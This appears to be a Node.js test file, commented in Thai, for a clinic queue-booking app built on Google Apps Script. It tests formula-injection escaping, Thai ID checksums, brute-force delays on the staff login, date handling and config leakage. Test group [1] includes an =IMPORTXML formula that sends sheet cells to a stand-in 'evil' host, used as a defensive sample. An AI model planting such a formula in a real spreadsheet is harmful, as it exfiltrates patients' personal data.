/**
 * ชุดตรวจสอบตรรกะของระบบจองคิว — รันด้วย:  node tests/check.js
 * ไม่ต้องต่ออินเทอร์เน็ต ไม่แตะ Google Sheets ไม่ส่ง LINE
 * จำลองบริการของ Google ขึ้นมาแล้วเรียกฟังก์ชันจริงใน gas/Code.gs และ assets/date-th.js
 */
const fs = require('fs'), vm = require('vm'), path = require('path');
const root = path.join(__dirname, '..');

let store = {}, sleeps = 0, props = { STAFF_KEY: 'Nk!2569-Th@iMed' };
const ctx = {
  console,
  PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k] || null, setProperty: (k, v) => { props[k] = v; } }) },
  CacheService: { getScriptCache: () => ({ get: k => (k in store ? store[k] : null), put: (k, v) => { store[k] = v; }, remove: k => { delete store[k]; } }) },
  SpreadsheetApp: {}, UrlFetchApp: {}, LockService: {}, ScriptApp: {},
  ContentService: { MimeType: { JSON: 'json' }, createTextOutput: t => ({ setMimeType: () => t }) },
  Utilities: {
    formatDate: (d, tz, f) => {
      const p = new Intl.DateTimeFormat('en-GB', { timeZone: tz, year: 'numeric', month: '2-digit',
        day: '2-digit', hour: '2-digit', minute: '2-digit', hourCycle: 'h23' })
        .formatToParts(d).reduce((a, x) => (a[x.type] = x.value, a), {});
      return f === 'yyyy-MM-dd' ? `${p.year}-${p.month}-${p.day}`
           : f === 'HH:mm' ? `${p.hour}:${p.minute}` : `${p.year}-${p.month}-${p.day}`;
    },
    getUuid: () => 'abcd1234', sleep: () => { sleeps++; }
  }
};
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(path.join(root, 'gas/Code.gs'), 'utf8'), ctx);
vm.runInContext(fs.readFileSync(path.join(root, 'assets/date-th.js'), 'utf8'), ctx);

let pass = 0, fail = 0;
const grp = n => console.log('\n' + n);
const t = (n, got, want) => {
  const ok = JSON.stringify(got) === JSON.stringify(want);
  ok ? pass++ : fail++;
  console.log((ok ? '  ✓ ' : '  ✗ ') + n + (ok ? '' : `\n      ได้ ${JSON.stringify(got)} ควรได้ ${JSON.stringify(want)}`));
};
const thr = (n, fn, code) => {
  try { fn(); fail++; console.log('  ✗ ' + n + ' — ไม่เกิดข้อผิดพลาดตามที่ควร'); }
  catch (e) { const ok = e.appCode === code; ok ? pass++ : fail++;
    console.log((ok ? '  ✓ ' : '  ✗ ') + n + (ok ? '' : ` — ได้รหัส ${e.appCode} ควรได้ ${code}`)); }
};
const mkId = p => { let s = 0; for (let i = 0; i < 12; i++) s += +p[i] * (13 - i); return p + String((11 - s % 11) % 10); };

grp('[1] กันสูตรฝังในชีต — ข้อมูลบัตรประชาชนต้องไม่ถูกดูดออกไป');
[['=IMPORTXML("http://evil/?d="&A1:Z9,"//a")'], ['+1+1'], ['-2+3'], ['@SUM(A1)'], ['\t=A1'], ['\r=A1']]
  .forEach(([v]) => t('ทำเป็นข้อความ: ' + JSON.stringify(v).slice(0, 28), ctx.cell_(v)[0], "'"));
t('ชื่อไทยปกติไม่ถูกแตะ', ctx.cell_('สมหญิง ศรีสะอาด'), 'สมหญิง ศรีสะอาด');
t('เครื่องหมาย = อยู่กลางข้อความไม่ถูกแตะ', ctx.cell_('A=B'), 'A=B');
t('ค่าว่าง', ctx.cell_(null), '');

grp('[2] checksum เลขบัตรประชาชน');
t('เลขถูกต้อง', ctx.validThaiId_(mkId('110170012345')), true);
t('เลขถูกต้อง (อีกชุด)', ctx.validThaiId_(mkId('310170099887')), true);
t('ผิด checksum', ctx.validThaiId_('1111111111111'), false);
t('มีขีดคั่นก็ยังผ่าน', ctx.validThaiId_(mkId('110170012345').replace(/(.)(....)(.....)(..)/, '$1-$2-$3-$4-')), true);
t('สั้นไป', ctx.validThaiId_('123'), false);

grp('[3] รหัสผ่านเจ้าหน้าที่');
const KEY = props.STAFF_KEY;
store = {}; sleeps = 0;
for (let i = 0; i < 8; i++) { try { ctx.staff_({ key: 'เดามั่ว' + i }); } catch (e) {} }
t('เดาผิด 8 ครั้ง โดนหน่วงเวลาครบทุกครั้ง', sleeps, 8);
let okLogin = true; try { ctx.staff_({ key: KEY }); } catch (e) { okLogin = false; }
t('รหัสถูก เข้าได้แม้กำลังถูกล็อก (คนอื่นเดารหัสไม่ทำให้เจ้าหน้าที่เข้าไม่ได้)', okLogin, true);
t('เข้าสำเร็จแล้วตัวนับถูกล้าง', store.staff_fail, undefined);
thr('รหัสผิดคืนรหัส STAFF_AUTH', () => ctx.staff_({ key: 'x' }), 'STAFF_AUTH');
thr('ไม่ส่งรหัสมาเลย', () => ctx.staff_({}), 'STAFF_AUTH');
props.STAFF_KEY = ''; store = {};
thr('ระบบยังไม่ได้ตั้งรหัส', () => ctx.staff_({ key: 'a' }), 'STAFF_AUTH');
props.STAFF_KEY = KEY; store = {};

grp('[4] การยืนยันตัวตนและรหัสข้อผิดพลาด');
thr('ไม่มี ID token', () => ctx.verify_(''), 'AUTH_EXPIRED');
const post = o => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(o) } }));
t('คำสั่งที่ไม่รู้จัก', post({ action: 'ไม่มีจริง' }).code, 'ERROR');
t('คำขอว่างเปล่าไม่ทำให้ระบบล้ม', JSON.parse(ctx.doPost({})).ok, false);
t('คำสั่งเจ้าหน้าที่โดยไม่มีรหัส', post({ action: 'range', from: '2026-09-01', to: '2026-09-20' }).code, 'STAFF_AUTH');
t('config เปิดสาธารณะได้', post({ action: 'config' }).ok, true);

grp('[5] กันค่าพิเศษตอนค้นแผนก');
['__proto__', 'constructor', 'toString', 'valueOf', 'zz'].forEach(k => t('dept_ ' + k, ctx.dept_(k), null));
t('dept_ แผนกที่มีจริง', ctx.dept_('tm').tag, 'ท');

grp('[6] ปฏิทินไทย');
t('slotStart 13:30–14:30', ctx.slotStart_('13:30–14:30'), 810);
t('dow_ 2026-09-21 = จันทร์', ctx.dow_('2026-09-21'), 1);
t('thDate_ เต็ม', ctx.thDate_('2026-09-21', true), 'จันทร์ที่ 21 ก.ย. 2569');
t('thDate_ สิ้นปี', ctx.thDate_('2026-12-31'), '31 ธ.ค. 2569');
[['2026-09-21', true], ['2026-02-31', false], ['2028-02-29', true], ['2027-02-29', false],
 ['2026-13-01', false], ['2026-04-31', false], ['2026-9-1', false], ['', false], ['abcd', false]]
  .forEach(([v, w]) => {
    t('วันที่มีอยู่จริง (หลังบ้าน): ' + (v || '(ว่าง)'), ctx.isYmd_(v), w);
    t('วันที่มีอยู่จริง (หน้าเว็บ): ' + (v || '(ว่าง)'), ctx.isYmd(v), w);
  });

grp('[7] วันที่เพี้ยนต้องไม่ทำหน้าเว็บพัง');
const today = ctx.bkkNow().date;
t('addDays ค่าว่าง ถอยไปวันนี้', ctx.addDays('', 0), today);
t('addDays ค่าขยะไม่ throw', typeof ctx.addDays('xx', 7), 'string');
t('thDate ค่าว่างไม่ขึ้น NaN', ctx.thDate('').indexOf('NaN'), -1);
t('thShort null ไม่ขึ้น NaN', ctx.thShort(null).indexOf('NaN'), -1);
t('thUntil ค่าว่าง = วันนี้', ctx.thUntil(''), 'วันนี้');
t('thUntil พรุ่งนี้', ctx.thUntil(ctx.addDays(today, 1)), 'พรุ่งนี้');
t('dow ค่าว่างยังเป็นตัวเลข', typeof ctx.dow(''), 'number');

grp('[8] ตัดข้อความยาวเกิน');
t('ตัดที่ 10 ตัว', ctx.clip_('0123456789abcdef', 10), '0123456789');
t('ตัดช่องว่างหัวท้าย', ctx.clip_('   ชื่อ   ', 100), 'ชื่อ');
t('อาการยาว 500 → 300', ctx.clip_('ก'.repeat(500), ctx.MAX_NOTE).length, 300);

grp('[9] โครงสร้างข้อมูลและการเปิดเผยข้อมูล');
t('มีคอลัมน์ remindedAt และอยู่ท้ายสุด', ctx.BOOK_COLS[ctx.BOOK_COLS.length - 1], 'remindedAt');
t('ทุกแผนกมีรายการบริการ', Object.keys(ctx.DEPTS).every(k => ctx.DEPTS[k].services.length > 0), true);
const cfg = ctx.a_config();
t('a_config ไม่มี token หรือรหัสผ่านหลุด', /token|secret|STAFF_KEY/i.test(JSON.stringify(cfg)), false);
t('a_config ไม่มีข้อมูลคนไข้', /idCard|userId|tel/.test(JSON.stringify(cfg)), false);
t('a_config มีครบ 2 แผนก', Object.keys(cfg.depts).sort(), ['dn', 'tm']);

console.log(`\n${'─'.repeat(46)}\nสรุป: ผ่าน ${pass} · ไม่ผ่าน ${fail}\n`);
process.exit(fail ? 1 : 0);
